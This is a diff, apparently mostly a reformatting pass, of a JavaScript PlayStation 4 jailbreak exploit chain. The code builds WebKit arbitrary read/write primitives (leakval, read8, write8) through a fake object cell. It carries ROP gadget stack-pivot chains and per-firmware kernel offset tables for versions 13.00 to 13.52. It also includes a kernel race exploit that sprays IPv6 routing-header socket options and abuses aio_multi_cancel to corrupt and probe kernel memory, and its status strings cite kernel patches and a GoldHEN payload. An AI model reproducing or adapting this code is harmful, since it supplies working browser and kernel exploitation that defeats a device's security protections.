-          `mem.promote: header gate failed worker-len=${pairStatus.workerWindow} worker-mode=${workerHeader[MODE_OFF]} main-mode=${mainRecord[MODE_OFF]} worker-sid=${u32At(workerHeader, 0)} main-sid=${pairStatus.structureID} worker-vector=0x${pairStatus.workerVector.toString()} worker-butterfly=0x${pairStatus.workerButterfly.toString()} main-home=0x${pairStatus.mainVector.toString()}`
+          `mem.promote: header gate failed worker-len=${pairStatus.workerWindow} worker-mode=${workerHeader[MODE_OFF]} main-mode=${mainRecord[MODE_OFF]} worker-sid=${u32At(workerHeader, 0)} main-sid=${pairStatus.structureID} worker-vector=0x${pairStatus.workerVector.toString()} worker-butterfly=0x${pairStatus.workerButterfly.toString()} main-home=0x${pairStatus.mainVector.toString()}`,
         );
       proveMagic(
         note,
@@ -1767,16 +1994,19 @@
         "workerIdentity",
         workerVector + PAIR_IDENT_OFFSET,
         workerMagic,
-        `vector=0x${pairStatus.workerVector.toString()}-cell=0x${pairStatus.workerAddress.toString()}-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`
+        `vector=0x${pairStatus.workerVector.toString()}-cell=0x${pairStatus.workerAddress.toString()}-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`,
       );
-      note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");
+      note(
+        "PAIR-IDENTITY",
+        "main-cell=proved-main-buffer=proved-worker=proved",
+      );
       for (let i = 0; i < 8; ++i)
         workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
       for (let i = 0; i < 4; ++i)
         workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];
       note(
         "PAIR-COMMIT",
-        `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-next=aim-without-restore`
+        `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-next=aim-without-restore`,
       );
       aimFor(workerAddr, PAIR_HEADER_BYTES);
       committed = true;
@@ -1785,25 +2015,30 @@
       pairStatus.workerLength = workerView.length;
       if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
         throw new Error(
-          `mem.promote: the m_length write did not land -- worker.length reads ${pairStatus.workerLength}`
+          `mem.promote: the m_length write did not land -- worker.length reads ${pairStatus.workerLength}`,
         );
       if (workerMirror.length !== WORKER_BUFFER_SIZE)
         throw new Error(
-          "mem.promote: the mirror was widened too -- the write went somewhere structural, not to worker's m_length"
+          "mem.promote: the mirror was widened too -- the write went somewhere structural, not to worker's m_length",
         );
       if (workerView[0] !== HOME_BYTE)
         throw new Error("mem.promote: worker no longer sees its own buffer");
-      if (mainView[MODE_OFF] !== workerHeader[MODE_OFF] || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0 || mainView[MODE_OFF + 3] !== 0)
+      if (
+        mainView[MODE_OFF] !== workerHeader[MODE_OFF] ||
+        mainView[MODE_OFF + 1] !== 0 ||
+        mainView[MODE_OFF + 2] !== 0 ||
+        mainView[MODE_OFF + 3] !== 0
+      )
         throw new Error("mem.promote: m_mode was disturbed by the widening");
       for (let i = 0; i < 8; ++i) {
         if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])
           throw new Error(
-            "mem.promote: worker's m_vector moved during the widening"
+            "mem.promote: worker's m_vector moved during the widening",
           );
       }
       note(
         "PAIR-WIDENED",
-        `length=0x${WORKER_LENGTH_MAX.toString(16)}-mode=0x${pairStatus.mode.toString(16)}`
+        `length=0x${WORKER_LENGTH_MAX.toString(16)}-mode=0x${pairStatus.mode.toString(16)}`,
       );
       pairVectorOffset = VECTOR_OFF;
       carrier = buildPairCarrier(fake);
@@ -1811,14 +2046,14 @@
       readInto(identityBytes2, workerVector + PAIR_IDENT_OFFSET, 8);
       if (!sameBytes2(identityBytes2, workerMagic, 8))
         throw new Error(
-          `mem.promote: read through the pair returned ${hexOf(identityBytes2, 8)}, expected ${hexOf(workerMagic, 8)}`
+          `mem.promote: read through the pair returned ${hexOf(identityBytes2, 8)}, expected ${hexOf(workerMagic, 8)}`,
         );
       write8(workerVector + PAIR_IDENT_OFFSET, new int64(218893066, 67305985));
       const back = [10, 11, 12, 13, 1, 2, 3, 4];
       for (let i = 0; i < 8; ++i) {
         if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
           throw new Error(
-            `mem.promote: write through the pair failed at byte ${i}`
+            `mem.promote: write through the pair failed at byte ${i}`,
           );
       }
       for (let i = 0; i < 8; ++i)
@@ -1827,18 +2062,21 @@
       pairStatus.leakvalAgrees = workerAgain === workerAddr;
       if (!pairStatus.leakvalAgrees)
         throw new Error(
-          `mem.promote: leakval through the pair disagrees (0x${toI64(workerAgain).toString()} vs 0x${pairStatus.workerAddress.toString()})`
+          `mem.promote: leakval through the pair disagrees (0x${toI64(workerAgain).toString()} vs 0x${pairStatus.workerAddress.toString()})`,
         );
       const mv = read8(mainAddr + VECTOR_OFF);
-      if (mv.low !== pairStatus.workerAddress.low || mv.hi !== pairStatus.workerAddress.hi)
+      if (
+        mv.low !== pairStatus.workerAddress.low ||
+        mv.hi !== pairStatus.workerAddress.hi
+      )
         throw new Error(
-          `mem.promote: main.m_vector reads 0x${mv.toString()}, expected worker's cell 0x${pairStatus.workerAddress.toString()}`
+          `mem.promote: main.m_vector reads 0x${mv.toString()}, expected worker's cell 0x${pairStatus.workerAddress.toString()}`,
         );
       if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
         throw new Error("mem.promote: main's own m_length was disturbed");
       note(
         "PAIR-REPROVED",
-        `main-m_vector=0x${mv.toString()}-leakval=0x${toI64(workerAgain).toString()}`
+        `main-m_vector=0x${mv.toString()}-leakval=0x${toI64(workerAgain).toString()}`,
       );
       note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
       const rel = releaseFakeCell();
@@ -1848,14 +2086,14 @@
         throw new Error("mem.promote: core.js did not release the fake cell");
       if (fake.assertHome() !== false)
         throw new Error(
-          "mem.promote: core.js's carrier still reports itself live"
+          "mem.promote: core.js's carrier still reports itself live",
         );
       pairStatus.promoted = true;
       pairStatus.state = "pair";
       pairStatus.error = null;
       note(
         "PAIR-UP",
-        `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-home=0x${pairStatus.mainVector.toString()}-mode=0x${pairStatus.mode.toString(16)}-sid=0x${pairStatus.structureID.toString(16)}-released=${pairStatus.released.length}-history-cleared=${pairStatus.historyCleared}`
+        `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-home=0x${pairStatus.mainVector.toString()}-mode=0x${pairStatus.mode.toString(16)}-sid=0x${pairStatus.structureID.toString(16)}-released=${pairStatus.released.length}-history-cleared=${pairStatus.historyCleared}`,
       );
       return pairStatus;
     } catch (error) {
@@ -1878,7 +2116,14 @@
           clean = false;
         }
         try {
-          if (!(workerView.length === WORKER_BUFFER_SIZE && workerMirror.length === WORKER_BUFFER_SIZE && workerView[0] === HOME_BYTE && fake.assertHome() === true))
+          if (
+            !(
+              workerView.length === WORKER_BUFFER_SIZE &&
+              workerMirror.length === WORKER_BUFFER_SIZE &&
+              workerView[0] === HOME_BYTE &&
+              fake.assertHome() === true
+            )
+          )
             clean = false;
         } catch {
           clean = false;
@@ -1903,7 +2148,7 @@
       mainView = null;
       note(
         "PAIR-FALLBACK",
-        `state=${pairStatus.state}-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}-main-at-home=${pairStatus.mainAtHome}-at=${pairStatus.failedAt}-${pairStatus.error}`
+        `state=${pairStatus.state}-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}-main-at-home=${pairStatus.mainAtHome}-at=${pairStatus.failedAt}-${pairStatus.error}`,
       );
       throw error;
     }
@@ -1921,7 +2166,7 @@
       write2,
       write4,
       write8,
-      leakval
+      leakval,
     };
     globalThis.p = prim;
     const opts = options || {};
@@ -1937,7 +2182,7 @@
       if (pairStatus.state === "broken") {
         globalThis.p = void 0;
         throw new Error(
-          `mem: the promotion failed AND its rollback did not verify -- window.p has been WITHDRAWN rather than published mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`
+          `mem: the promotion failed AND its rollback did not verify -- window.p has been WITHDRAWN rather than published mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`,
         );
       }
     }
@@ -1967,7 +2212,7 @@
     wk_ArrayBuffer_m_impl: 16,
     wk_ArrayBuffer_m_contents_m_data: 16,
     wk___imp___error: 63671496,
-    wk___imp_pthread_create: 63675392
+    wk___imp_pthread_create: 63675392,
   };
   var KERNEL_STUBS = {
     3: 180592,
@@ -2004,7 +2249,7 @@
     663: 181216,
     664: 186176,
     666: 185664,
-    669: 179696
+    669: 179696,
   };
   var COMMON_KERNEL_DATA = {
     k_oid_kern_file: 27457696,
@@ -2017,35 +2262,35 @@
     k_prison0: 2764e4,
     k_rootvnode: 34827920,
     k_sysent: 17836912,
-    k_sysent_661: 17868640
+    k_sysent_661: 17868640,
   };
   var KERNEL_1300 = {
     k_idt_rsvd: 1842496,
     k_sysctl_handle_int: 4169872,
     k_jmp_rsi: 293681,
     k_kl_lock: 945184,
-    k_evf_cv: 0
+    k_evf_cv: 0,
   };
   var KERNEL_1302 = {
     k_idt_rsvd: 1842512,
     k_sysctl_handle_int: 4169888,
     k_jmp_rsi: 293681,
     k_kl_lock: 945184,
-    k_evf_cv: 7883224
+    k_evf_cv: 7883224,
   };
   var KERNEL_1350 = {
     k_idt_rsvd: 1842528,
     k_sysctl_handle_int: 4170976,
     k_jmp_rsi: 293681,
     k_kl_lock: 945184,
-    k_evf_cv: 7884312
+    k_evf_cv: 7884312,
   };
   var KERNEL_1352 = {
     k_idt_rsvd: 1842688,
     k_sysctl_handle_int: 4172e3,
     k_jmp_rsi: 317136,
     k_kl_lock: 945248,
-    k_evf_cv: 7885352
+    k_evf_cv: 7885352,
   };
   var COMMON_KERNEL = {
     ...COMMON_KERNEL_DATA,
@@ -2054,33 +2299,36 @@
     k_pthread_create: 65808,
     k_scan_stage1: 262144,
     k_scan_stage2: 393216,
-    k_stubs: KERNEL_STUBS
+    k_stubs: KERNEL_STUBS,
   };
   var COMMON_BASE = {
     ...COMMON_WEBKIT,
-    ...COMMON_KERNEL
+    ...COMMON_KERNEL,
   };
   var PS4 = {
     "13.00": {
       ...COMMON_BASE,
-      fw_status: "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",
-      payload: "payload.bin"
+      fw_status:
+        "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",
+      payload: "payload.bin",
     },
     13.02: {
       ...COMMON_BASE,
       ...KERNEL_1302,
       alias_of: "13.00",
-      fw_status: "state=663-JB+KPATCH-PROVEN-on-hw-pass=51 shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=MEASURED-from-kernel_1302.elf (16/16 GO) same-kernel-as=13.04 kpatch=1302.bin-HW-PROVEN-KEXEC-rc0 payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
+      fw_status:
+        "state=663-JB+KPATCH-PROVEN-on-hw-pass=51 shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=MEASURED-from-kernel_1302.elf (16/16 GO) same-kernel-as=13.04 kpatch=1302.bin-HW-PROVEN-KEXEC-rc0 payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
       kpatch: "binaries/1302.bin",
-      payload: "payloads/goldhen.bin"
+      payload: "payloads/goldhen.bin",
     },
     13.04: {
       ...COMMON_BASE,
       ...KERNEL_1302,
       alias_of: "13.00",
-      fw_status: "state=663-JB+KPATCH-via-13.02(pass=51) shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=SAME-KERNEL-AS-13.02 (measured from kernel_1302.elf, 16/16 GO) kpatch=1302.bin-shared-HW-PROVEN payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
+      fw_status:
+        "state=663-JB+KPATCH-via-13.02(pass=51) shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=SAME-KERNEL-AS-13.02 (measured from kernel_1302.elf, 16/16 GO) kpatch=1302.bin-shared-HW-PROVEN payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
       kpatch: "binaries/1302.bin",
-      payload: "payloads/goldhen.bin"
+      payload: "payloads/goldhen.bin",
     },
     "13.50": {
       ...COMMON_WEBKIT,
@@ -2091,9 +2339,10 @@
       k_scan_stage1: 262144,
       k_scan_stage2: 393216,
       k_stubs: KERNEL_STUBS,
-      fw_status: "state=663-JB-PROVEN-on-hw webkit=13.00-module libkernel=13.50-stubs kernel_rvas=MEASURED-from-kernel_1350.elf (kderive 16/16, adversarial 16/16 GO) kpatch=1350.bin-BUILT-10/10-neg-controls-pass-UNTESTED-on-hw payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
+      fw_status:
+        "state=663-JB-PROVEN-on-hw webkit=13.00-module libkernel=13.50-stubs kernel_rvas=MEASURED-from-kernel_1350.elf (kderive 16/16, adversarial 16/16 GO) kpatch=1350.bin-BUILT-10/10-neg-controls-pass-UNTESTED-on-hw payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
       kpatch: "binaries/1350.bin",
-      payload: "payloads/goldhen.bin"
+      payload: "payloads/goldhen.bin",
     },
     13.52: {
       ...COMMON_WEBKIT,
@@ -2105,10 +2354,11 @@
       k_scan_stage2: 393216,
       k_stubs: KERNEL_STUBS,
       alias_of: "13.50",
-      fw_status: "state=663-LIVE-on-hardware shares=13.50 (webkit+libkernel) kernel_rvas=MEASURED-from-kernel_1352.elf (kdump5 tier1 36MB pass=39/0, kderive 16/16 recipes) kpatch=1352.bin-24-sites-verified-OFFLINE-ONLY payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
+      fw_status:
+        "state=663-LIVE-on-hardware shares=13.50 (webkit+libkernel) kernel_rvas=MEASURED-from-kernel_1352.elf (kdump5 tier1 36MB pass=39/0, kderive 16/16 recipes) kpatch=1352.bin-24-sites-verified-OFFLINE-ONLY payload=goldhen.bin (patched-GoldHEN KP'd 2/2) bug=663",
       kpatch: "binaries/1352.bin",
-      payload: "payloads/goldhen.bin"
-    }
+      payload: "payloads/goldhen.bin",
+    },
   };
   function offsetsFor(uaString) {
     const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
@@ -2173,7 +2423,7 @@
     write: 4,
     sysctl: 202,
     kill: 37,
-    getppid: 39
+    getppid: 39,
   };
   var JSVALUE_UNDEFINED = new int64(10, 4294967287);
   var keepAlive2 = [];
@@ -2193,453 +2443,593 @@
     const opened = [];
     let closeFd = null;
     try {
-      let bufAddr = function(ab) {
-        const c = p.leakval(ab);
-        return p.read8(
-          p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data)
-        );
-      }, put = function(dv, at, v) {
-        if (typeof v === "number") {
-          dv.setUint32(at, v >>> 0, true);
-          dv.setUint32(at + 4, v < 0 ? 4294967295 : 0, true);
-        } else {
-          dv.setUint32(at, v.low >>> 0, true);
-          dv.setUint32(at + 4, v.hi >>> 0, true);
-        }
-      }, makeCtx = function() {
-        const sb = new ArrayBuffer(32), pb = new ArrayBuffer(PB_SIZE);
-        const kb = new ArrayBuffer(8192), fb = new ArrayBuffer(64);
-        keepAlive2.push(sb, pb, kb, fb);
-        const c = {
-          storeDv: new DataView(sb),
-          pivotDv: new DataView(pb),
-          stackDv: new DataView(kb),
-          frameDv: new DataView(fb),
-          stackU8: new Uint8Array(kb),
-          frameU8: new Uint8Array(fb)
-        };
-        keepAlive2.push(
-          c.storeDv,
-          c.pivotDv,
-          c.stackDv,
-          c.frameDv,
-          c.stackU8,
-          c.frameU8
-        );
-        c.S = bufAddr(sb);
-        c.P = bufAddr(pb);
-        c.K = bufAddr(kb);
-        c.F = bufAddr(fb);
-        put(c.storeDv, 0, G.G1);
-        put(c.storeDv, 8, c.P);
-        put(c.storeDv, 16, G.G3);
-        put(c.storeDv, 24, G.G2);
-        put(c.pivotDv, 0, c.P);
-        put(c.pivotDv, 16, G.G5);
-        put(c.pivotDv, 32, G.G4);
-        return c;
-      }, layout = function(c, target, args) {
-        c.stackU8.fill(0);
-        c.frameU8.fill(0);
-        const insts = [];
-        for (let i = 0; i < args.length; ++i) {
-          insts.push(argGadget[i]);
-          insts.push(args[i]);
-        }
-        const targetIdx = insts.length;
-        insts.push(target);
-        insts.push(G.POP_RDI_RET);
-        insts.push(c.F);
-        insts.push(G.MOV_RDI_RAX_RET);
-        insts.push(G.POP_RAX_RET);
-        insts.push(JSVALUE_UNDEFINED);
-        insts.push(G.LEAVE_RET);
-        let at = 8192 - 8 * insts.length;
-        if ((c.K.low + at + 8 * targetIdx & 15) !== 0) at -= 8;
-        for (let i = 0; i < insts.length; ++i)
-          put(c.stackDv, at + 8 * i, insts[i]);
-        put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
-      }, callAddr = function(target, args) {
-        layout(M, target, args);
-        const saved = p.read8(pivotCell);
-        p.write8(pivotCell, M.S);
-        Math.expm1(pivotObj);
-        p.write8(pivotCell, saved);
-        return {
-          lo: M.frameDv.getUint32(0, true),
-          hi: M.frameDv.getUint32(4, true),
-          i32: M.frameDv.getUint32(0, true) | 0
-        };
-      }, errno = function() {
-        const r = callAddr(errorFn, []);
-        const a = new int64(r.lo, r.hi);
-        return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
-      }, makeRpc = function(wk, name) {
-        let seq = 0;
-        const pending = /* @__PURE__ */ new Map();
-        wk.onmessage = function(e) {
-          const d = e.data || {};
-          const slot = pending.get(d.id);
-          if (!slot) return;
-          pending.delete(d.id);
-          if (slot.timer) clearTimeout(slot.timer);
-          if (d.type === "err") slot.reject(new Error(String(d.value)));
-          else slot.resolve(d.value);
-        };
-        wk.onerror = (e) => mark(
-          "WORKER-ONERROR",
-          name + " " + (e && e.message ? e.message : String(e))
-        );
-        return function call(fname, timeoutMs, ...args) {
-          return new Promise(function(resolve, reject) {
-            const id = seq++;
-            const timer = timeoutMs > 0 ? setTimeout(function() {
-              pending.delete(id);
-              reject(new Error(name + ": timeout waiting for " + fname));
-            }, timeoutMs) : null;
-            pending.set(id, { resolve, reject, timer });
-            wk.postMessage({ id, name: fname, args });
-          });
-        };
-      }, ptrish = function(v) {
-        return v.hi > 0 && v.hi < 65536 && (v.low & 7) === 0;
-      }, setNode0 = function(nextAddr, secondDec) {
-        new Uint8Array(pAb).fill(0);
-        pDv.setUint8(1, RTH_LEN);
-        pDv.setUint8(3, RTH_SEGLEFT);
-        put(pDv, 8, secondDec);
-        put(pDv, 16, M_AD);
-        put(pDv, 48, nextAddr);
-      }, presetNode0Dec = function() {
-        n0dDv.setUint32(0, 4, true);
-        n0dDv.setUint32(4, 0, true);
-        return sc(SYS.getsockopt, POOL[0], SOL_SOCKET, SO_TYPE, NODE0_DEC, n0dAd).i32;
-      }, armOnce = function() {
-        try {
-          if (typeof A !== "undefined" && A) A.busy = 1;
-        } catch (e) {
-        }
-        const g = armCount + 1;
-        const at = function(t, d) {
-          if (armTrace) trace(t, "a=" + g + " " + d);
-        };
-        at("ARM-P1-FREE", "pool=" + POOL.length);
-        for (const fd of POOL)
-          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-        at("ARM-P2-SUBMIT", "freed=" + POOL.length);
-        const rs = sc(
-          SYS.aio_submit_cmd,
-          1 | 4096,
-          bufAddr(rqAb),
-          NUM,
-          3,
-          idAd2
-        ).i32;
-        if (rs !== 0) {
-          at("ARM-SUBMIT-FAIL", "rs=" + rs);
-          return "submit=" + rs;
-        }
-        toDv.setUint32(0, TOWAIT, true);
-        toDv.setUint32(4, 0, true);
-        at(
-          "ARM-P3-WAIT",
-          "to=" + TOWAIT + "us submit=0 to_rb=" + toDv.getUint32(0, true) + " toad=" + toAd
-        );
-        const tw0 = Date.now();
-        sc(SYS.aio_multi_wait, idAd2, NUM, stAd2, 0, toAd);
-        armedEver = true;
-        waitMs = Date.now() - tw0;
-        let n = 0;
-        for (const fd of POOL)
-          if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0)
-            n++;
-        armCount++;
-        at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
-        return "ok sprayed=" + n + " wait=" + waitMs + "ms";
-      }, wnode = function(i, decAddr, sinkAddr, last) {
-        const o = i * NODE_SZ;
-        put(arDv, o + 0, decAddr);
-        put(arDv, o + 8, sinkAddr);
-        put(arDv, o + 16, M_AD);
-        put(arDv, o + 24, 0);
-        put(arDv, o + 32, 0);
-        put(arDv, o + 40, 0);
-        put(arDv, o + 48, last ? 0 : arAd.add32(o + NODE_SZ));
-      }, neutralise = function(where, sink) {
-        setNode0(0, sink);
-        let renew2 = 0;
-        for (const fd of POOL)
-          if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0)
-            renew2++;
-        mark(
-          "PR-NEUTRALISE-EARLY",
-          where + " next=0 on " + renew2 + "/" + POOL.length
-        );
-      }, fireOk = function(where) {
-        if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
-        mark(
-          "REFUSING-TO-INTERPRET",
-          where + " node0_sink=" + lastFire.n0 + " f_socket=" + lastFire.fsock + " forced=" + (lastFire.faked ? 1 : 0)
-        );
-        neutralise(where, N0SINK);
-        return false;
-      }, whoHasF = function() {
-        let found = -1, hits = 0, state0 = 0;
-        for (let i = 0; i < POOL.length; i++) {
-          glDv.setInt32(0, RTH_SIZE, true);
-          glDv.setInt32(4, 0, true);
-          new Uint8Array(gfAb).fill(0);
-          if (sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd).i32 !== 0)
-            continue;
-          const st = gfDv.getUint32(32, true) >>> 0;
-          if (st !== 0) {
-            hits++;
-            if (found < 0) {
-              found = i;
-              state0 = st;
-            }
-          }
-        }
-        return { idx: found, hits, state: state0 };
-      }, reapNow = function(tag) {
-        if (!REAP || reapedGen === armCount) return;
-        wnode(0, DUM, DUM, true);
-        reapedGen = armCount;
-        const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
-        let stsC = "";
-        for (let k = 0; k < NUM; k++)
-          stsC += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
-        const p2 = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
-        let stsP = "";
-        for (let k = 0; k < NUM; k++)
-          stsP += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
-        const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
-        let sts = "";
-        for (let k = 0; k < NUM; k++)
-          sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
-        reapAt = Date.now();
-        mark(
-          "REAP",
-          tag + " gen=" + reapedGen + " cancel=" + c + " poll=" + p2 + " delete=" + d + " c=[" + stsC + "] p=[" + stsP + "] st=[" + sts + "]"
-        );
-      }, runChain = function(nNodes, label) {
-        snkDv.setInt32(0, 1073741824, true);
-        snkDv.setInt32(32, 1073741824, true);
-        trace(
-          "CH-MTX-PRE",
-          label + " owner=" + (mU32[OWNER_HI] >>> 0).toString(16) + ":" + (mU32[OWNER_LO] >>> 0).toString(16) + " want=0:4"
-        );
-        mU32[OWNER_LO] = 4;
-        mU32[OWNER_HI] = 0;
-        let a = "ok reused";
-        if (fireIdx >= FIRES) {
-          const n0save = arAb.slice(0, NODE_SZ);
-          reapNow("pre-arm a=" + armCount);
-          new Uint8Array(arAb, 0, NODE_SZ).set(new Uint8Array(n0save));
-          setNode0(arAd, N0SINK);
-          a = armOnce();
-          if (a.indexOf("ok") !== 0) {
-            mark("PR-ARM-FAIL", label + " " + a);
-            return null;
-          }
-          fireIdx = 0;
-        } else {
-          setNode0(arAd, N0SINK);
-        }
-        const fireN = fireIdx;
-        sc(SYS.aio_multi_cancel, idAd2.add32(4 * fireIdx), 1, stAd2);
-        fireIdx++;
-        trace(
-          "CH-CANCEL-DONE",
-          label + " nodes=" + nNodes + " fire=" + fireN + "/" + FIRES + " arm=" + armCount + " returned"
-        );
-        const moved = 1073741824 - snkDv.getInt32(0, true);
-        const w = whoHasF();
-        const faked = FAKEMISS >= 0 && armCount === FAKEMISS;
-        const n0 = faked ? 0 : 1073741824 - snkDv.getInt32(32, true);
-        lastFire = {
-          n0,
-          fsock: w.idx,
-          fhits: w.hits,
-          faked,
-          label
-        };
-        mark(
-          "PR-FIRE",
-          label + " nodes=" + nNodes + " sink_moved=" + moved + " node0_sink=" + n0 + " forced=" + (faked ? 1 : 0) + " f_socket=" + w.idx + " f_hits=" + w.hits + " state=0x" + w.state.toString(16) + " (" + a + ")"
-        );
-        if (n0 === 1 && w.idx < 0)
-          mark(
-            "PR-F-UNSEEN",
-            "node0 fired but no pool socket carries the state write -- F went to something outside the pool"
+      let bufAddr = function (ab) {
+          const c = p.leakval(ab);
+          return p.read8(
+            p
+              .read8(c.add32(off.wk_ArrayBuffer_m_impl))
+              .add32(off.wk_ArrayBuffer_m_contents_m_data),
           );
-        return moved;
-      }, simPattern = function(bv, low) {
-        let w = bv << 24 >>> 0 | low & 16777215 | 0;
-        let out = "";
-        for (let k = 0; k < SWEEP; k++) {
-          w = w - STEPMAG | 0;
-          w = w - 1 | 0;
-          out += w <= 0 ? "1" : "0";
-        }
-        return out;
-      }, decodeByte = function(obs, low) {
-        let hit = -1, n = 0;
-        for (let bv = 0; bv < 256; bv++)
-          if (simPattern(bv, low) === obs) {
-            if (hit < 0) hit = bv;
-            n++;
-          }
-        return { b: hit, n };
-      }, oracleAt = function(addr, n, label) {
-        const sAb = new ArrayBuffer(4);
-        keepAlive2.push(sAb);
-        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
-        sDv.setInt32(0, 1073741824, true);
-        let i = 0;
-        for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
-        put(arDv, (i - 1) * NODE_SZ + 48, 0);
-        if (runChain(i, label) === null) return null;
-        if (!fireOk(label)) return null;
-        const m = 1073741824 - sDv.getInt32(0, true);
-        return { m, v: m > 0 ? n - m + 1 : 0 };
-      }, sweepAt = function(stepAd, probeAd, low, label) {
-        const sAb = new ArrayBuffer(4 * SWEEP);
-        keepAlive2.push(sAb);
-        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
-        for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 1073741824, true);
-        let i = 0;
-        for (let k = 0; k < SWEEP; k++) {
-          wnode(i++, stepAd, DUM, false);
-          wnode(i++, probeAd, sAd.add32(k * 4), false);
-        }
-        put(arDv, (i - 1) * NODE_SZ + 48, 0);
-        if (runChain(i, label) === null) return null;
-        if (!fireOk(label)) return null;
-        let obs = "";
-        for (let k = 0; k < SWEEP; k++)
-          obs += 1073741824 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
-        return decodeByte(obs, low);
-      }, planSub = function(cur, delta) {
-        const d = [
-          delta & 255,
-          delta >>> 8 & 255,
-          delta >>> 16 & 255,
-          delta >>> 24 & 255
-        ];
-        let clean = true;
-        for (let j = 1; j < 4; j++)
-          if (d[j] > (cur >>> 8 * j & 255)) clean = false;
-        return { d, n: d[0] + d[1] + d[2] + d[3], clean };
-      }, emitSub = function(base, i, plan) {
-        const pos = [];
-        for (let j = 0; j < 4; j++)
-          for (let q = 0; q < plan.d[j]; q++) pos.push(j);
-        for (let j = 0; j < pos.length; j++)
-          wnode(i++, base.add32(pos[j]), DUM, false);
-        return i;
-      }, multiFire = function(jobs, label) {
-        let need2 = 0;
-        for (const j of jobs) need2 += j.kind === "sweep" ? SWEEP * 2 : j.n;
-        mark(
-          "MF-PLAN",
-          label + " jobs=" + jobs.length + " nodes=" + need2 + " kinds=" + jobs.map(function(j) {
-            return j.kind;
-          }).join(",")
-        );
-        if (!check(
-          "mf-bounded-" + label,
-          need2 > 0 && need2 <= MAXN,
-          "need=" + need2 + " arena=" + MAXN
-        ))
-          return null;
-        const nSink = jobs.reduce(function(a, j) {
-          return a + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0);
-        }, 0);
-        const sAb = new ArrayBuffer(4 * Math.max(1, nSink));
-        keepAlive2.push(sAb);
-        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
-        for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 1073741824, true);
-        let i = 0, sk = 0;
-        const base = [];
-        for (const j of jobs) {
-          base.push(sk);
-          if (j.kind === "sweep") {
-            for (let k = 0; k < SWEEP; k++) {
-              wnode(i++, j.step, DUM, false);
-              wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
-            }
-            sk += SWEEP;
-          } else if (j.kind === "oracle") {
-            for (let k = 0; k < j.n; k++)
-              wnode(i++, j.addr, sAd.add32(sk * 4), false);
-            sk += 1;
+        },
+        put = function (dv, at, v) {
+          if (typeof v === "number") {
+            dv.setUint32(at, v >>> 0, true);
+            dv.setUint32(at + 4, v < 0 ? 4294967295 : 0, true);
           } else {
-            for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
+            dv.setUint32(at, v.low >>> 0, true);
+            dv.setUint32(at + 4, v.hi >>> 0, true);
           }
-        }
-        if (i === 0)
-          return jobs.map(function() {
+        },
+        makeCtx = function () {
+          const sb = new ArrayBuffer(32),
+            pb = new ArrayBuffer(PB_SIZE);
